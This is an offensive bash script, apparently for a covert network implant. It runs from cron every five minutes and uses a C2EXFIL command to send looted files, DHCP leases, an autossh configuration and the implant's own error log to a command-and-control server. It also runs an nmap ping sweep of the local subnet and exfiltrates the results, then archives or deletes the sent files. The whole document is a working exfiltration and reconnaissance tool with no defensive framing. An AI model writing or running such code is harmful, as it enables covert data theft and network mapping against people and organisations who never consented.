#!/bin/bash
# Grabs anything in /usb/loot and exfils to c2
# Archives in /usb/looted
# */5 * * * * * bash /usb/scripts/5minute.sh

# comments
# [!] error
# [*] info
# [+] success

## vars
loot="/usb/loot"
looted="/usb/looted"
timestamp=`date +"%Y-%y-%d_%H%M%S"`

file_array=(
  '/var/dhcp.leases'
  '/etc/config/autossh'
)

# Add a flag for verbose mode
verbose=0
while getopts "v" opt; do
  case ${opt} in
    v)
      verbose=1
      ;;
    \?)
      echo "Invalid option: -$OPTARG" >&2
      ;;
  esac
done

# get the default route gateway
default_gateway=$(ip route | grep default | awk '{print $3}')
# get the default route's interface
default_interface=$(ip route | grep default | awk '{print $5}')
# get netmask from the default interface
default_net_mask=$(ip addr show $default_interface | grep $default_gateway | grep inet | grep -v 'default' | awk '{print $2}' | cut -f2 -d'/')

# Print the line only in verbose mode
if [ $verbose -eq 1 ]; then
  echo $default_interface: $default_gateway/$default_net_mask
fi

## functions
exfil_keep() {
  if [ -z "$2" ]
  then
    source="misc"
  else
    source="$2"
  fi

  C2EXFIL STRING $1 ${HOSTNAME}-$source

}

exfil() {
  if [ -z "$2" ]
  then
    lsource="misc"
  else
    lsource="$2"
  fi

  if C2EXFIL STRING $1 ${HOSTNAME}-$lsource
  then
    mv $1 ${looted}
  else
    echo "[!] error exfiltrating $1"
  fi
}

## look at me go!
# look for loot
echo "## exfil loot"
lootlist=(/usb/loot/*)

for counter in ${!lootlist[*]}; do
  if [ -f ${lootlist[counter]} ]
  then
    size=$(wc -c <"${lootlist[counter]}")
    if [ $size -gt 0 ]
    then
      if [ -f "${lootlist[counter]}" ]; then
        echo "[+] exfil ${lootlist[counter]}"
        exfil "${lootlist[counter]}" "loot"
      else
        echo "[*] No loot to exfil"
      fi
    else
      rm ${lootlist[counter]}
    fi
  fi

done

# loop thru the array of files that we keep like system files
for file in "${file_array[@]}"
do
    size=$(wc -c <"$file")
    if [ $size -gt 0 ]
    then
    if [ -f $file ]
      then
        echo "[+] exfil $file"
        exfil_keep $file
      fi
    fi
done

# look and exfil for cc-client-error logs
if [ -s "/var/cc-client-error.log" ]
  then
    echo "[+] exfil cc-client error logs"
    if exfil /var/cc-client-error.log cc-client-log
    then
      rm /var/cc-client-error.log
    fi
  else
    echo "[*] No cc-client-error.log to exfil"
fi

# run a quick nmap against the local network
jobtimestamp=${timestamp}
if nmap -sn ${default_gateway}/${default_net_mask} > /usb/${jobtimestamp}_quickscan.txt
  then
    echo "[+] nmap quick scan complete"
    echo "[*] exfil /usb/${jobtimestamp}_quickscan.txt"
    exfil /usb/${jobtimestamp}_quickscan.txt nmap-scan_local
fi
